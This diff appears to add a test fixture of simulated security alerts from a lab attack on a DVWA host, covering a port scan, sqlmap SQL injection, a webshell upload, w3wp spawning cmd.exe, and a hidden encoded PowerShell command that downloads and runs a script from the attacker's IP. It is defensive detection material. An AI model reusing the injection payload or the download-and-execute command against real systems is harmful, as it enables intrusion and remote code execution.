@@ -1,0 +1,135 @@
+{
+  "alerts": [
+    {
+      "alert_id": "scene1:portscan:001",
+      "rule_name": "Network Port Scan Detected",
+      "rule_level": "medium",
+      "attack_ids": ["T1595", "T1046"],
+      "surface": "network",
+      "timestamp": "2026-09-27T01:20:00Z",
+      "src_ip": "192.168.56.10",
+      "dest_ip": "192.168.56.20",
+      "dest_port": 445,
+      "host": "sensor-net-01",
+      "summary": "Network Port Scan Detected | 192.168.56.10 -> 192.168.56.20:445 | host=sensor-net-01",
+      "fields": {
+        "proto": "TCP",
+        "app_proto": "failed",
+        "flow": {
+          "pkts_toserver": 1,
+          "pkts_toclient": 0,
+          "bytes_toserver": 60,
+          "bytes_toclient": 0,
+          "start": "2026-09-27T01:20:00.123456+0000",
+          "end": "2026-09-27T01:20:00.123999+0000",
+          "src_ip": "192.168.56.10",
+          "dest_ip": "192.168.56.20",
+          "src_port": 54321,
+          "dest_port": 445
+        },
+        "signature": "ET SCAN Possible TCP Port Scan",
+        "signature_id": 2001219,
+        "category": "Attempted Information Leak",
+        "severity": 2,
+        "sensor": "suricata-lab"
+      }
+    },
+    {
+      "alert_id": "scene1:sqli:002",
+      "rule_name": "Web SQLi Attempt",
+      "rule_level": "high",
+      "attack_ids": ["T1190"],
+      "surface": "web",
+      "timestamp": "2026-09-27T01:23:00Z",
+      "src_ip": "192.168.56.10",
+      "dest_ip": "192.168.56.20",
+      "dest_port": 80,
+      "host": "proxy01",
+      "summary": "Web SQLi Attempt | 192.168.56.10 -> 192.168.56.20:80 | host=proxy01",
+      "fields": {
+        "request_method": "GET",
+        "request_uri": "/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit",
+        "http_user_agent": "sqlmap/1.7.2#stable (http://sqlmap.org)",
+        "http_referer": "http://192.168.56.20/dvwa/",
+        "status": 200,
+        "bytes": 4523,
+        "remote_addr": "192.168.56.10"
+      }
+    },
+    {
+      "alert_id": "scene1:webshell_upload:003",
+      "rule_name": "Webshell File Upload",
+      "rule_level": "high",
+      "attack_ids": ["T1505.003"],
+      "surface": "web",
+      "timestamp": "2026-09-27T01:24:30Z",
+      "src_ip": "192.168.56.10",
+      "dest_ip": "192.168.56.20",
+      "dest_port": 80,
+      "host": "proxy01",
+      "summary": "Webshell File Upload | 192.168.56.10 -> 192.168.56.20:80 | host=proxy01",
+      "fields": {
+        "request_method": "POST",
+        "request_uri": "/dvwa/hackable/uploads/shell.aspx",
+        "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "content_type": "multipart/form-data; boundary=----WebKitFormBoundaryXyZ",
+        "upload_filename": "shell.aspx",
+        "upload_size": 3120,
+        "status": 200,
+        "remote_addr": "192.168.56.10"
+      }
+    },
+    {
+      "alert_id": "scene1:w3wp_spawn_cmd:004",
+      "rule_name": "Web Server Spawning Shell",
+      "rule_level": "critical",
+      "attack_ids": ["T1505.003", "T1059"],
+      "surface": "endpoint",
+      "timestamp": "2026-09-27T01:25:15Z",
+      "src_ip": "192.168.56.10",
+      "dest_ip": "",
+      "dest_port": null,
+      "host": "web-win-01",
+      "summary": "Web Server Spawning Shell |  -> :None | host=web-win-01",
+      "fields": {
+        "event_id": 1,
+        "event_type": "process_creation",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "cmd.exe /c whoami",
+        "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+        "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\"",
+        "User": "IIS APPPOOL\\DefaultAppPool",
+        "IntegrityLevel": "High",
+        "CurrentDirectory": "C:\\Windows\\System32\\inetsrv\\",
+        "ProcessId": "6120",
+        "ParentProcessId": "4892",
+        "UtcTime": "2026-09-27 01:25:15.412"
+      }
+    },
+    {
+      "alert_id": "scene1:powershell_enc:005",
+      "rule_name": "Encoded PowerShell Command",
+      "rule_level": "high",
+      "attack_ids": ["T1059.001"],
+      "surface": "endpoint",
+      "timestamp": "2026-09-27T01:25:45Z",
+      "src_ip": "192.168.56.10",
+      "dest_ip": "",
+      "dest_port": null,
+      "host": "web-win-01",
+      "summary": "Encoded PowerShell Command |  -> :None | host=web-win-01",
+      "fields": {
+        "event_id": 1,
+        "event_type": "process_creation",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADAALwBwAC4AcABzADEAJwApAA==",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "User": "IIS APPPOOL\\DefaultAppPool",
+        "IntegrityLevel": "High",
+        "ProcessId": "6444",
+        "ParentProcessId": "6120",
+        "UtcTime": "2026-09-27 01:25:45.023"
+      }
+    }
+  ]
+}
